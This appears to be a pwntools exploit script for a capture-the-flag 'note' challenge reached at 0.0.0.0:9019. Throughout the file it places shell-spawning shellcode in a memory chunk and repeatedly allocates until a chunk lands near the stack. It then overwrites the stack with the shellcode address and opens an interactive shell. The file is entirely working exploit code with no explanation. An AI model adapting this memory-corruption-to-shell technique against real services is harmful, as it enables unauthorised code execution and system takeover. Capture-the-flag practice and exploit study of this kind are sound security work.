from pwn import *
import re

elf = context.binary = ELF("./note")

def create():
    io.recvuntil(b"exit\n")
    io.sendline(b"1")
    io.recvline()
    line = io.recvline().strip().decode()
    address = "0x" + re.findall("[a-z0-9]{8}",line)[0]
    io.info(address)
    return address

def write(idx,payload):
    io.recvuntil(b"exit\n")
    io.sendline(b"2")
    io.recvuntil(b"note no?\n")
    io.sendline(str(idx).encode())
    io.recvuntil(b" (MAX : 4096 byte)\n")
    io.sendline(payload)

def delete(idx):
    io.recvuntil(b"exit\n")
    io.sendline(b"4")
    io.recvuntil(b"note no?\n")
    io.sendline(str(idx).encode())

shellcode = asm(shellcraft.sh())
end = False

for _ in range(100):
    #io = process("./loader")
    io = remote("0.0.0.0",9019)
    # maybe you need to add some sleep
    try: 
        # Create a mmap chunk with shellcode inside
        shellcode_chunk = int(create(),16)
        write(0,shellcode)

        # Mmap a chunk near the stack
        for i in range(1024):
            trampoline_chunk = create()
            if "0xfff" in trampoline_chunk:
                print("Jackpot!")
                break
            else:
                delete(1)
            if i == 1023:
                io.close()
                end = True

        # Retry
        if end:
            end = False
            continue

        # Make the stack grow a little to overlap with the chunk
        for _ in range(0x20):
            io.sendline(b"1") 

        # Overwrite the stack with the address of our shellcode chunk
        write(1,p32(shellcode_chunk)*1024)

        # Return to our faked return address
        io.sendline(b"5")

        # Shell (hopefully)
        io.interactive()

    except Exception as e:
        print("Error!")
        io.close()
